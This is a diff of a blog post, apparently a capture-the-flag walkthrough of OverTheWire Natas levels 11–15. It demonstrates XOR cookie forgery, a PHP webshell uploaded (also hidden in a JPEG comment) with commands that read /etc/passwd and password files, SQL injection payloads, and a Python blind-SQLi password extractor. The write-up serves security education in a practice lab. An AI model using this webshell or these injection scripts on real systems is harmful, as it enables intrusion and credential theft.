@@ -12,16 +12,17 @@ toc_sticky: true
 
 PHP sourcecode:
 
-<pre class="lang:php decode:true">&lt;?
-$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
+{% highlight php %}
+<?
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
 
 function xor_encrypt($in) {
-    $key = '&lt;censored&gt;';
+    $key = '<censored>';
     $text = $in;
     $outText = '';
 
     // Iterate through each character
-    for($i=0;$i&lt;strlen($text);$i++) {
+    for($i=0;$i<strlen($text);$i++) {
     $outText .= $text[$i] ^ $key[$i % strlen($key)];
     }
 
@@ -56,27 +57,24 @@ if(array_key_exists("bgcolor",$_REQUEST)) {
 }
 
 saveData($data);
+?>
 
+<h1>natas11</h1>
+<div id="content">
+<body style="background: <?=$data['bgcolor']?>;">
+Cookies are protected with XOR encryption<br/><br/>
 
-
-?&gt;
-
-&lt;h1&gt;natas11&lt;/h1&gt;
-&lt;div id="content"&gt;
-&lt;body style="background: &lt;?=$data['bgcolor']?&gt;;"&gt;
-Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt;
-
-&lt;?
+<?
 if($data["showpassword"] == "yes") {
-    print "The password for natas12 is &lt;censored&gt;&lt;br&gt;";
+    print "The password for natas12 is <censored><br>";
 }
+?>
 
-?&gt;
-
-&lt;form&gt;
-Background color: &lt;input name=bgcolor value="&lt;?=$data['bgcolor']?&gt;"&gt;
-&lt;input type=submit value="Set color"&gt;
-&lt;/form&gt;</pre>
+<form>
+Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
+<input type=submit value="Set color">
+</form>
+{% endhighlight %}
 
 #### Attempt 1.
 
@@ -84,42 +82,32 @@ Since there&#8217;s an input box here that can set the &#8220;bgcolor&#8221; var
 
 Maybe we can break the JSON with a quotation character and inject another &#8220;showpassword&#8221; value. Typing it into the form field should look like <span class="lang:php highlight:0 decode:true crayon-inline">&#8220;,&#8221;showpassword&#8221;:&#8221;yes&#8221;</span> .
 
-However, that didn&#8217;t work, thanks to the character filter <span class="lang:php decode:true crayon-inline">preg_match(&#8216;/^#(?:[a-f\d]{6})$/i&#8217;, $_REQUEST[&#8216;bgcolor&#8217;])</span> . Back to the drawing board&#8230;
+However, that didn&#8217;t work, thanks to the character filter `preg_match(‘/^#(?:[a-f\d]{6})$/i’, $_REQUEST[‘bgcolor’])` . Back to the drawing board&#8230;
 
 #### Attempt 2
 
-The bottom part of the sourcecode suggests that if we get the $data (which is a JSON array saved in a cookie) variable &#8220;showpassword&#8221; to be &#8220;yes&#8221;, then we will get the next password. And the line <span class="lang:php decode:true crayon-inline ">$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&#8220;data&#8221;])), true);</span> shows that our cookie is json encoded, then xor_encrypted, then base64 encoded.
+The bottom part of the sourcecode suggests that if we get the $data (which is a JSON array saved in a cookie) variable &#8220;showpassword&#8221; to be &#8220;yes&#8221;, then we will get the next password. And the line `$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[“data”])), true);` shows that our cookie is json encoded, then xor_encrypted, then base64 encoded.
 
 To inject the &#8220;showpassword&#8221; value, we will need to recreate all these things and save it in the &#8220;data&#8221; cookie.
 
 The JSON format for the values needed is:
 
-<div class="json" tabindex="-1">
-  <p>
-    <span class="lang:php highlight:0 decode:true crayon-inline">{&#8220;showpassword&#8221;:&#8221;yes&#8221;,&#8221;bgcolor&#8221;:&#8221;#ffffff&#8221;}</span>
-  </p>
+
+`{“showpassword”:”yes”,”bgcolor”:”#ffffff”}`
   
-  <p>
-    For the XOR encryption, I did a quick Google search and found a <a href="http://code.activestate.com/recipes/266586-simple-xor-keyword-encryption/">python script</a> I can use for this. I modified it a little to work with arguments passed to it instead of hardcoded values.
-  </p>
+
+For the XOR encryption, I did a quick Google search and found a <a href="http://code.activestate.com/recipes/266586-simple-xor-keyword-encryption/">python script</a> I can use for this. I modified it a little to work with arguments passed to it instead of hardcoded values.
+
+When putting it all together with the <strong>current level&#8217;s password </strong>as the XOR key, it did NOTHING when I set that as the cookie. So that&#8217;s not the key, we need to figure out what it is.
+
+XOR isn&#8217;t a particularly good method of encryption, and very vulnerable to a known plaintext attack. We can probably get the key out since we know what data should decrypt to: `{“showpassword”:”no”,”bgcolor”:”#ffffff”}`
+
+The cookie data value is &#8220;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#8221; , so we would just XOR that with the JSON code above and hopefully get a good result.
+
+The code I used for the decryption is (based on <a href="https://gist.github.com/revolunet/2412240">this script</a>):
   
-  <p>
-    When putting it all together with the <strong>current level&#8217;s password </strong>as the XOR key, it did NOTHING when I set that as the cookie. So that&#8217;s not the key, we need to figure out what it is.
-  </p>
-  
-  <p>
-    XOR isn&#8217;t a particularly good method of encryption, and very vulnerable to a known plaintext attack. We can probably get the key out since we know what data should decrypt to: <span class="lang:python highlight:0 decode:true crayon-inline">{&#8220;showpassword&#8221;:&#8221;no&#8221;,&#8221;bgcolor&#8221;:&#8221;#ffffff&#8221;}</span>
-  </p>
-  
-  <p>
-    The cookie data value is &#8220;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#8221; , so we would just XOR that with the JSON code above and hopefully get a good result.
-  </p>
-  
-  <p>
-    The code I used for the decryption is (based on <a href="https://gist.github.com/revolunet/2412240">this script</a>):
-  </p>
-  
-  <pre class="lang:python decode:true">#!/usr/bin/python
+{% highlight python %}
+#!/usr/bin/python
 # NB : this is not secure
 # from http://code.activestate.com/recipes/266586-simple-xor-keyword-encryption/
 # added base64 encoding for simple querystring :)
@@ -139,20 +127,14 @@ def xor_crypt_string(data, key='awesomepassword', encode=True, decode=True):
 
 if __name__ == '__main__':
 	result = xor_crypt_string('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=', '{"showpassword":"no","bgcolor":"#ffffff"}', False, True)
-	print(result)</pre>
+	print(result)
+{% endhighlight %}
   
-  <p>
-    The output is &#8220;qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq&#8221; which is clearly a good result! That means the key is &#8220;qw8J&#8221;! Now that we have the key, it can be used to make a new cookie with the values we want.
-  </p>
-  
-  <p>
-    String to encrypt should be: <span class="lang:python highlight:0 decode:true crayon-inline">{&#8220;showpassword&#8221;:&#8221;yes&#8221;,&#8221;bgcolor&#8221;:&#8221;#ffffff&#8221;}</span> , with the key &#8220;qw8J&#8221;. Change the script above to use these values and presto!
-  </p>
-  
-  <p>
-    &#8220;ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#8221; is the output, just put that in the cookie with Burp and you&#8217;ll have the password!
-  </p>
-</div>
+The output is &#8220;qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq&#8221; which is clearly a good result! That means the key is &#8220;qw8J&#8221;! Now that we have the key, it can be used to make a new cookie with the values we want.
+
+String to encrypt should be: `{“showpassword”:”yes”,”bgcolor”:”#ffffff”}`, with the key &#8220;qw8J&#8221;. Change the script above to use these values and presto!
+
+&#8220;ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#8221; is the output, just put that in the cookie with Burp and you&#8217;ll have the password!
 
 &nbsp;
 
@@ -162,56 +144,57 @@ if __name__ == '__main__':
 
 Sourcecode PHP:
 
-<pre class="lang:php decode:true ">&lt;? 
-
+{% highlight php %}
+<?
 function genRandomString() {
-    $length = 10;
-    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
-    $string = "";    
+  $length = 10;
+  $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+  $string = "";  
 
-    for ($p = 0; $p &lt; $length; $p++) {
-        $string .= $characters[mt_rand(0, strlen($characters)-1)];
-    }
+  for ($p = 0; $p < $length; $p++) {
+    $string .= $characters[mt_rand(0, strlen($characters)-1)];
+  }
 
-    return $string;
+  return $string;
 }
 
 function makeRandomPath($dir, $ext) {
-    do {
-    $path = $dir."/".genRandomString().".".$ext;
-    } while(file_exists($path));
-    return $path;
+  do {
+  $path = $dir."/".genRandomString().".".$ext;
+  } while(file_exists($path));
+  return $path;
 }
 
 function makeRandomPathFromFilename($dir, $fn) {
-    $ext = pathinfo($fn, PATHINFO_EXTENSION);
-    return makeRandomPath($dir, $ext);
+  $ext = pathinfo($fn, PATHINFO_EXTENSION);
+  return makeRandomPath($dir, $ext);
 }
 
 if(array_key_exists("filename", $_POST)) {
-    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
 
 
-        if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {
-        echo "File is too big";
-    } else {
-        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
-            echo "The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded";
-        } else{
-            echo "There was an error uploading the file, please try again!";
-        }
+  if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+    echo "File is too big";
+  } else {
+    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+      echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+    } else{
+      echo "There was an error uploading the file, please try again!";
     }
+  }
 } else {
-?&gt;
+?>
 
-&lt;form enctype="multipart/form-data" action="index.php" method="POST"&gt;
-&lt;input type="hidden" name="MAX_FILE_SIZE" value="1000" /&gt;
-&lt;input type="hidden" name="filename" value="&lt;? print genRandomString(); ?&gt;.jpg" /&gt;
-Choose a JPEG to upload (max 1KB):&lt;br/&gt;
-&lt;input name="uploadedfile" type="file" /&gt;&lt;br /&gt;
-&lt;input type="submit" value="Upload File" /&gt;
-&lt;/form&gt;
-&lt;? } ?&gt;</pre>
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<? } ?>
+{% endhighlight %}
 
 #### Attempt 1
 
@@ -221,7 +204,7 @@ I made a very small JPEG file since the max is only 1KB, and first tested it on 
 
 <img class="alignnone size-full wp-image-230" src="/assets/uploads/2019/09/2019-09-13_09h18_19.png" alt="" width="601" height="139" srcset="/assets/uploads/2019/09/2019-09-13_09h18_19.png 601w, /assets/uploads/2019/09/2019-09-13_09h18_19-300x69.png 300w" sizes="(max-width: 601px) 100vw, 601px" /> 
 
-So it does randomize the name but preserve the extension. If I put in &#8220;/../&#8221; into the extension, maybe I can go up a directory. My system gave me a warning that files can&#8217;t be named with &#8220;/&#8221; in it, so maybe I can use URL encoding to get around that. I am able to save a filename that way, but the page doesn&#8217;t care, it replaces my filename completely and appends a &#8220;.jpg&#8221; as the extension with <span class="lang:php decode:true crayon-inline"><input type=&#8221;hidden&#8221; name=&#8221;filename&#8221; value=&#8221;<? print genRandomString(); ?>.jpg&#8221; /></span> .
+So it does randomize the name but preserve the extension. If I put in &#8220;/../&#8221; into the extension, maybe I can go up a directory. My system gave me a warning that files can&#8217;t be named with &#8220;/&#8221; in it, so maybe I can use URL encoding to get around that. I am able to save a filename that way, but the page doesn&#8217;t care, it replaces my filename completely and appends a &#8220;.jpg&#8221; as the extension with `<input type=”hidden” name=”filename” value=”.jpg” />`.
 
 #### Attempt 2
 
@@ -233,25 +216,23 @@ I confirmed the vulnerability does allow me to load a PHP file. Since a link to 
 
 Here is the webshell I used:
 
-<pre class="lang:php decode:true ">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;
-
-&lt;?php
-
+{% highlight php %}
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+<?php
 if(isset($_REQUEST['cmd'])){
-        echo "&lt;pre&gt;";
+        echo "<pre>";
         $cmd = ($_REQUEST['cmd']);
         system($cmd);
-        echo "&lt;/pre&gt;";
+        echo "</pre>";
         die;
 }
-
-?&gt;
+?>
 
 Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+<!--    http://michaeldaw.org   2006    -->
+{% endhighlight %}
 
-&lt;!--    http://michaeldaw.org   2006    --&gt;</pre>
-
-And this command gave the password: <span class="lang:php highlight:0 decode:true crayon-inline">http://natas12.natas.labs.overthewire.org/upload/2hqri8g7u3.php?cmd=cat+/etc/natas_webpass/natas13</span>
+And this command gave the password: `http://natas12.natas.labs.overthewire.org/upload/2hqri8g7u3.php?cmd=cat+/etc/natas_webpass/natas13`
 
 &nbsp;
 
@@ -267,7 +248,7 @@ So there&#8217;s a check on the file contents itself. We can probably add just t
 
 Using some tools on my Kali box, I wrote the PHP webshell into the comment section of a JPEG file:
 
-<span class="lang:zsh decode:true crayon-inline">wrjpgcom -cfile phpupload upload.jpg > test.jpg</span>
+`wrjpgcom -cfile phpupload upload.jpg > test.jpg`
 
 After I uploaded it with the form, I used Burp to modify the form submission to change the extension (like the last level) to php. The results:
 
@@ -281,37 +262,39 @@ After I uploaded it with the form, I used Burp to modify the form submission to 
 
 This level is a common user authentication form. Let&#8217;s see the sourcecode.
 
-<pre class="lang:php decode:true">&lt;?
+{% highlight php %}
+<?
 if(array_key_exists("username", $_REQUEST)) {
-    $link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');
-    mysql_select_db('natas14', $link);
-    
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query&lt;br&gt;";
-    }
+  $link = mysql_connect('localhost', 'natas14', '<censored>');
+  mysql_select_db('natas14', $link);
+  
+  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+  if(array_key_exists("debug", $_GET)) {
+    echo "Executing query: $query<br>";
+  }
 
-    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {
-            echo "Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;";
-    } else {
-            echo "Access denied!&lt;br&gt;";
-    }
-    mysql_close($link);
+  if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+      echo "Successful login! The password for natas15 is <censored><br>";
+  } else {
+      echo "Access denied!<br>";
+  }
+  mysql_close($link);
 } else {
-?&gt;
+?>
 
-&lt;form action="index.php" method="POST"&gt;
-Username: &lt;input name="username"&gt;&lt;br&gt;
-Password: &lt;input name="password"&gt;&lt;br&gt;
-&lt;input type="submit" value="Login" /&gt;
-&lt;/form&gt;
-&lt;? } ?&gt;</pre>
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<? } ?>
+{% endhighlight %}
 
-There is a simple SQL Injection vulnerability since the input has no filters or checks on it.  Sending a double quote character will break the SQL and prove the vulnerability:
+There is a simple SQL Injection vulnerability since the input has no filters or checks on it. Sending a double quote character will break the SQL and prove the vulnerability:
 
 <img class="alignnone size-full wp-image-239" src="/assets/uploads/2019/09/2019-09-13_10h54_10.png" alt="" width="594" height="209" srcset="/assets/uploads/2019/09/2019-09-13_10h54_10.png 594w, /assets/uploads/2019/09/2019-09-13_10h54_10-300x106.png 300w" sizes="(max-width: 594px) 100vw, 594px" /> 
 
-A simple SQLi statement should get us in, we don&#8217;t even need to put anything in the password field if we comment out the rest of the query.  The most basic statement is <span class="lang:tsql highlight:0 decode:true crayon-inline">&#8220;or 1=1 &#8212;</span> but it only works if there&#8217;s a trailing space. I suppose that&#8217;s so the query sees the comment mark &#8216;&#8211;&#8216; instead of &#8216;&#8211;\&#8221;&#8216;. Alternatively, you could probably use the other comment character &#8220;#&#8221;.
+A simple SQLi statement should get us in, we don&#8217;t even need to put anything in the password field if we comment out the rest of the query. The most basic statement is `“or 1=1 —- ` but it only works if there&#8217;s a trailing space. I suppose that&#8217;s so the query sees the comment mark &#8216;&#8211;&#8216; instead of &#8216;&#8211;\&#8221;&#8216;. Alternatively, you could probably use the other comment character &#8220;#&#8221;.
 
 <img class="alignnone size-full wp-image-240" src="/assets/uploads/2019/09/2019-09-13_11h00_23.png" alt="" width="601" height="157" srcset="/assets/uploads/2019/09/2019-09-13_11h00_23.png 601w, /assets/uploads/2019/09/2019-09-13_11h00_23-300x78.png 300w" sizes="(max-width: 601px) 100vw, 601px" /> 
 
@@ -323,8 +306,8 @@ A simple SQLi statement should get us in, we don&#8217;t even need to put anythi
 
 And the sourcecode:
 
-<pre class="lang:php decode:true">&lt;?
-
+{% highlight php %}
+<?
 /*
 CREATE TABLE `users` (
   `username` varchar(64) DEFAULT NULL,
@@ -333,38 +316,39 @@ CREATE TABLE `users` (
 */
 
 if(array_key_exists("username", $_REQUEST)) {
-    $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;');
-    mysql_select_db('natas15', $link);
-    
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query&lt;br&gt;";
-    }
+  $link = mysql_connect('localhost', 'natas15', '<censored>');
+  mysql_select_db('natas15', $link);
+  
+  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+  if(array_key_exists("debug", $_GET)) {
+    echo "Executing query: $query<br>";
+  }
 
-    $res = mysql_query($query, $link);
-    if($res) {
-    if(mysql_num_rows($res) &gt; 0) {
-        echo "This user exists.&lt;br&gt;";
-    } else {
-        echo "This user doesn't exist.&lt;br&gt;";
-    }
-    } else {
-        echo "Error in query.&lt;br&gt;";
-    }
+  $res = mysql_query($query, $link);
+  if($res) {
+  if(mysql_num_rows($res) > 0) {
+    echo "This user exists.<br>";
+  } else {
+    echo "This user doesn't exist.<br>";
+  }
+  } else {
+    echo "Error in query.<br>";
+  }
 
-    mysql_close($link);
+  mysql_close($link);
 } else {
-?&gt;
+?>
 
-&lt;form action="index.php" method="POST"&gt;
-Username: &lt;input name="username"&gt;&lt;br&gt;
-&lt;input type="submit" value="Check existence" /&gt;
-&lt;/form&gt;
-&lt;? } ?&gt;</pre>
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<? } ?>
+{% endhighlight %}
 
 It looks like another SQL Injection just like the previous level. Let&#8217;s try a basic SQLi statement like before:
 
-<span class="lang:mysql decode:true crayon-inline">&#8220;or 1=1 &#8212; </span>
+`"or 1=1 -- `
 
 <img class="alignnone size-full wp-image-242" src="/assets/uploads/2019/09/2019-09-13_11h05_51.png" alt="" width="595" height="136" srcset="/assets/uploads/2019/09/2019-09-13_11h05_51.png 595w, /assets/uploads/2019/09/2019-09-13_11h05_51-300x69.png 300w" sizes="(max-width: 595px) 100vw, 595px" /> 
 
@@ -374,7 +358,8 @@ The script only shows a few different possible outputs, depending on the state o
 
 Best way that I know of is to validate each character of the password with the output states &#8220;This user exists&#8221; or &#8220;This user doesn&#8217;t exist&#8221;. Since doing this by hand will take forever and a day, a python script is how I chose to do it. Here is my code to get the password:
 
-<pre class="lang:python decode:true  ">#!/usr/bin/python3
+{% highlight python %}
+#!/usr/bin/python3
 #
 # main execution script for solving natas15 on OverTheWire.org
 
@@ -389,44 +374,44 @@ password = ''
 # Our target URL
 target = "http://natas15.natas.labs.overthewire.org"
 headers = {
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101',
-    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
+  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101',
+  'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
 }
 
 
 def send_query(query):
-    payload = {'username': query}
-    print("Payload: " + str(payload))
-    response = requests.post(target + '/index.php?', data=payload, headers=headers)
-    return response
+  payload = {'username': query}
+  print("Payload: " + str(payload))
+  response = requests.post(target + '/index.php?', data=payload, headers=headers)
+  return response
 
 
 r = requests.get(target, headers=headers)
 if r.status_code != requests.codes.ok:
-    raise ValueError('Couldn\'t connect to target :(')
+  raise ValueError('Couldn\'t connect to target :(')
 else:
-    print('Target reachable. Starting character parsing...')
+  print('Target reachable. Starting character parsing...')
 
 # Get list of characters used so we don't have to iterate unnecessarily
 print("Getting list of characters used...")
 for c in allChars:
-    print("Trying Character: " + c)
-    resp = send_query('natas16" and password like "%s%s%s" #' % ("%", c, "%"))
-    if 'exists' in str(resp.content):
-        usedChars += c
-        print("Character found: " + c)
+  print("Trying Character: " + c)
+  resp = send_query('natas16" and password like "%s%s%s" #' % ("%", c, "%"))
+  if 'exists' in str(resp.content):
+    usedChars += c
+    print("Character found: " + c)
 print("Characters used: " + usedChars)
 
 # Retrieve the password one char at a time
 for i in range(1, 33):
-    print("Testing password...")
-    for c in usedChars:
-        print("Trying Character: " + c)
-        print("Password so far: " + password)
-        resp = send_query('natas16" and ascii(substring((select password from users where username="natas16"),%d,1))=%s #' % (i, ord(c)))
-        if 'exists' in str(resp.content):
-            password += c
-            break
+  print("Testing password...")
+  for c in usedChars:
+    print("Trying Character: " + c)
+    print("Password so far: " + password)
+    resp = send_query('natas16" and ascii(substring((select password from users where username="natas16"),%d,1))=%s #' % (i, ord(c)))
+    if 'exists' in str(resp.content):
+      password += c
+      break
 
 print('Password: ' + password)
-</pre>
+{% endhighlight %}
